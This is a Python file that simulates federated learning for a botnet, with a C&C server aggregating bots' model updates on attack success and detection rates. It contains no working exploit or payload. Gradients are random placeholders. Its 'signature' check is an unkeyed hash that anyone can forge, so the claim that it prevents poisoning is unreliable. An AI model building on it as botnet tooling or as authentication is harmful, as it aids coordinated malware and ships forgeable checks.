#!/usr/bin/env python3
"""
Federated Learning for Distributed Bot Network

Instead of bots learning independently, they share knowledge:
- Each bot trains locally on its own experiences
- Model updates (not raw data) are sent to C&C
- C&C aggregates updates from all bots
- Improved global model is distributed back to bots

Benefits:
- Privacy-preserving (no raw attack data transmitted)
- Faster convergence (learning from 1000s of bots)
- Resilient to bot loss
- Better generalization
"""

import numpy as np
import json
import logging
import hashlib
from typing import List, Dict, Tuple
from dataclasses import dataclass, asdict
from collections import defaultdict
import time

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass


class ModelUpdate:
    """Model update from a single bot"""
    bot_id: str
    timestamp: int
    gradient_updates: Dict[str, List[float]]  # layer_name -> gradients
    num_samples: int  # How many experiences this bot trained on
    performance_metrics: Dict[str, float]  # success_rate, detection_rate, etc.
    signature: str  # Cryptographic signature for authenticity


@dataclass


class GlobalModel:
    """Global model shared across all bots"""
    version: int
    weights: Dict[str, List[float]]  # layer_name -> weights
    timestamp: int
    num_bots_contributed: int
    aggregate_performance: Dict[str, float]


class FederatedAggregator:
    """
    Central aggregator (runs on C&C server)

    Implements Federated Averaging (FedAvg) algorithm:
    w_global = Σ(n_k/n * w_k) where:
    - w_k = weights from bot k
    - n_k = number of samples from bot k
    - n = total samples
    """

    def __init__(self, initial_model: GlobalModel):
        self.global_model = initial_model
        self.update_buffer: List[ModelUpdate] = []
        self.bot_performance: Dict[str, float] = {}  # bot_id -> trust score
        self.malicious_bots: set = set()

        logger.info(f"Federated aggregator initialized (model v{initial_model.version})")

    def receive_update(self, update: ModelUpdate) -> bool:
        """
        Receive and validate update from a bot

        Returns:
            True if update accepted, False if rejected
        """
        # Check if bot is blacklisted
        if update.bot_id in self.malicious_bots:
            logger.warning(f"Rejected update from blacklisted bot: {update.bot_id}")
            return False

        # Verify signature (prevent poisoning attacks)
        if not self._verify_signature(update):
            logger.warning(f"Invalid signature from bot: {update.bot_id}")
            self.malicious_bots.add(update.bot_id)
            return False

        # Validate update size (prevent model corruption)
        if not self._validate_update_size(update):
            logger.warning(f"Invalid update size from bot: {update.bot_id}")
            return False

        # Check for Byzantine attacks (outlier detection)
        if not self._check_byzantine(update):
            logger.warning(f"Byzantine behavior detected: {update.bot_id}")
            self.malicious_bots.add(update.bot_id)
            return False

        self.update_buffer.append(update)
        self.bot_performance[update.bot_id] = update.performance_metrics.get('success_rate', 0.0)

        logger.info(f"Accepted update from {update.bot_id} ({update.num_samples} samples)")
        return True

    def aggregate_updates(self, min_updates: int = 10) -> GlobalModel:
        """
        Aggregate updates using Federated Averaging

        Args:
            min_updates: Minimum number of updates before aggregation

        Returns:
            New global model
        """
        if len(self.update_buffer) < min_updates:
            logger.info(f"Waiting for more updates ({len(self.update_buffer)}/{min_updates})")
            return self.global_model

        logger.info(f"Aggregating {len(self.update_buffer)} updates")

        # Calculate total samples
        total_samples = sum(u.num_samples for u in self.update_buffer)

        # Weighted average of gradients
        aggregated_weights = defaultdict(lambda: None)

        for layer_name in self.global_model.weights.keys():
            weighted_sum = None

            for update in self.update_buffer:
                if layer_name not in update.gradient_updates:
                    continue

                # Weight by number of samples
                weight = update.num_samples / total_samples

                # Weight by bot performance (trust score)
                trust = self.bot_performance.get(update.bot_id, 0.5)
                weight *= trust

                gradients = np.array(update.gradient_updates[layer_name])

                if weighted_sum is None:
                    weighted_sum = weight * gradients
                else:
                    weighted_sum += weight * gradients

            if weighted_sum is not None:
                # Apply aggregated gradients to global model
                current_weights = np.array(self.global_model.weights[layer_name])
                new_weights = current_weights + weighted_sum
                aggregated_weights[layer_name] = new_weights.tolist()

        # Calculate aggregate performance
        avg_performance = {
            'success_rate': np.mean([u.performance_metrics.get('success_rate', 0)
                                    for u in self.update_buffer]),
            'detection_rate': np.mean([u.performance_metrics.get('detection_rate', 0)
                                      for u in self.update_buffer])
        }

        # Create new global model
        new_model = GlobalModel(
            version=self.global_model.version + 1,
            weights=dict(aggregated_weights),
            timestamp=int(time.time()),
            num_bots_contributed=len(self.update_buffer),
            aggregate_performance=avg_performance
        )

        logger.info(f"New global model v{new_model.version}: "
                   f"success={avg_performance['success_rate']:.2f}, "
                   f"detection={avg_performance['detection_rate']:.2f}")

        # Clear buffer
        self.update_buffer.clear()
        self.global_model = new_model

        return new_model

    def _verify_signature(self, update: ModelUpdate) -> bool:
        """Verify cryptographic signature of update"""
        # Simplified - in production use Ed25519
        data = json.dumps({
            'bot_id': update.bot_id,
            'timestamp': update.timestamp,
            'gradients': update.gradient_updates
        }, sort_keys=True)

        expected_sig = hashlib.sha256(data.encode()).hexdigest()[:32]
        return update.signature == expected_sig

    def _validate_update_size(self, update: ModelUpdate) -> bool:
        """Validate update isn't suspiciously large/small"""
        for layer_name, gradients in update.gradient_updates.items():
            if layer_name not in self.global_model.weights:
                return False

            expected_size = len(self.global_model.weights[layer_name])
            if len(gradients) != expected_size:
                return False

        return True

    def _check_byzantine(self, update: ModelUpdate) -> bool:
        """Detect Byzantine attacks (malicious updates)"""
        if len(self.update_buffer) < 3:
            return True  # Not enough data to compare

        # Check if gradients are within reasonable bounds
        for layer_name, gradients in update.gradient_updates.items():
            grad_array = np.array(gradients)

            # Compare to recent updates
            recent_grads = [np.array(u.gradient_updates.get(layer_name, [0]))
                          for u in self.update_buffer[-10:]]

            if len(recent_grads) > 0:
                recent_mean = np.mean([g.mean() for g in recent_grads if len(g) > 0])
                recent_std = np.std([g.mean() for g in recent_grads if len(g) > 0])

                # Outlier detection: beyond 3 standard deviations
                if abs(grad_array.mean() - recent_mean) > 3 * recent_std:
                    return False

        return True

    def get_global_model(self) -> GlobalModel:
        """Get current global model for distribution"""
        return self.global_model

    def save_model(self, filepath: str):
        """Save global model to file"""
        with open(filepath, 'w') as f:
            json.dump(asdict(self.global_model), f, indent=2)
        logger.info(f"Saved global model v{self.global_model.version} to {filepath}")


class FederatedClient:
    """
    Client-side federated learning (runs on each bot)
    """

    def __init__(self, bot_id: str, global_model: GlobalModel):
        self.bot_id = bot_id
        self.local_model = global_model
        self.local_updates: List[Dict] = []
        self.training_buffer = []

        logger.info(f"Federated client initialized: {bot_id}")

    def train_local(self, experiences: List[Tuple], epochs: int = 5):
        """
        Train on local experiences

        Args:
            experiences: List of (state, action, reward, next_state) tuples
            epochs: Number of training epochs
        """
        logger.info(f"Training locally on {len(experiences)} experiences for {epochs} epochs")

        # Simplified gradient calculation
        # In production, this would use actual neural network training

        gradients = {}
        for layer_name in self.local_model.weights.keys():
            # Simulate gradient calculation
            current_weights = np.array(self.local_model.weights[layer_name])

            # Simple gradient: average reward * small learning rate
            avg_reward = np.mean([exp[2] for exp in experiences])  # exp[2] is reward
            learning_rate = 0.01

            gradient = np.random.randn(len(current_weights)) * avg_reward * learning_rate
            gradients[layer_name] = gradient.tolist()

        self.local_updates.append({
            'gradients': gradients,
            'num_samples': len(experiences),
            'performance': {
                'success_rate': np.mean([1 if exp[2] > 0 else 0 for exp in experiences]),
                'avg_reward': np.mean([exp[2] for exp in experiences])
            }
        })

    def create_update(self) -> ModelUpdate:
        """Create update to send to aggregator"""
        if not self.local_updates:
            raise ValueError("No local updates to send")

        # Aggregate local gradients
        aggregated_grads = defaultdict(list)
        total_samples = 0

        for update in self.local_updates:
            total_samples += update['num_samples']
            for layer, grads in update['gradients'].items():
                aggregated_grads[layer].append(np.array(grads))

        # Average gradients
        final_grads = {}
        for layer, grads_list in aggregated_grads.items():
            final_grads[layer] = np.mean(grads_list, axis=0).tolist()

        # Calculate performance metrics
        perf_metrics = {
            'success_rate': np.mean([u['performance']['success_rate']
                                    for u in self.local_updates]),
            'detection_rate': 0.1  # Placeholder
        }

        # Create signature
        data = json.dumps({
            'bot_id': self.bot_id,
            'timestamp': int(time.time()),
            'gradients': final_grads
        }, sort_keys=True)
        signature = hashlib.sha256(data.encode()).hexdigest()[:32]

        update = ModelUpdate(
            bot_id=self.bot_id,
            timestamp=int(time.time()),
            gradient_updates=final_grads,
            num_samples=total_samples,
            performance_metrics=perf_metrics,
            signature=signature
        )

        # Clear local updates after creating update
        self.local_updates.clear()

        return update

    def update_from_global(self, global_model: GlobalModel):
        """Update local model from global model"""
        self.local_model = global_model
        logger.info(f"Updated to global model v{global_model.version}")


# Example usage and testing
if __name__ == '__main__':
    print("="*60)
    print("Federated Learning Simulation")
    print("="*60)

    # Initialize global model
    initial_weights = {
        'layer1': [0.1] * 10,
        'layer2': [0.2] * 5,
        'output': [0.3] * 3
    }

    global_model = GlobalModel(
        version=0,
        weights=initial_weights,
        timestamp=int(time.time()),
        num_bots_contributed=0,
        aggregate_performance={'success_rate': 0.5, 'detection_rate': 0.3}
    )

    # Create aggregator (C&C server)
    aggregator = FederatedAggregator(global_model)

    # Simulate 20 bots
    print(f"\nSimulating 20 bots training locally...")  # noqa: F541
    clients = [FederatedClient(f"bot_{i:03d}", global_model) for i in range(20)]

    # Round 1: Bots train and send updates
    print("\nRound 1: Local training")
    for client in clients:
        # Simulate experiences: (state, action, reward, next_state)
        experiences = [
            (None, None, np.random.uniform(-10, 50), None)
            for _ in range(np.random.randint(10, 100))
        ]

        client.train_local(experiences)
        update = client.create_update()
        aggregator.receive_update(update)

    # Aggregate
    new_global = aggregator.aggregate_updates(min_updates=10)
    print(f"\nGlobal model updated to v{new_global.version}")
    print(f"  Bots contributed: {new_global.num_bots_contributed}")
    print(f"  Avg success rate: {new_global.aggregate_performance['success_rate']:.3f}")

    # Round 2: Bots update and train again
    print("\nRound 2: Bots receive global model and train again")
    for client in clients:
        client.update_from_global(new_global)

        experiences = [
            (None, None, np.random.uniform(-5, 60), None)  # Better performance
            for _ in range(np.random.randint(10, 100))
        ]

        client.train_local(experiences)
        update = client.create_update()
        aggregator.receive_update(update)

    new_global = aggregator.aggregate_updates(min_updates=10)
    print(f"\nGlobal model updated to v{new_global.version}")
    print(f"  Avg success rate: {new_global.aggregate_performance['success_rate']:.3f}")

    # Save final model
    aggregator.save_model('/tmp/federated_model.json')

    print("\n" + "="*60)
    print("Federated learning complete!")
    print(f"Final model version: {new_global.version}")
    print(f"Performance improvement: "
          f"{global_model.aggregate_performance['success_rate']:.3f} → "
          f"{new_global.aggregate_performance['success_rate']:.3f}")
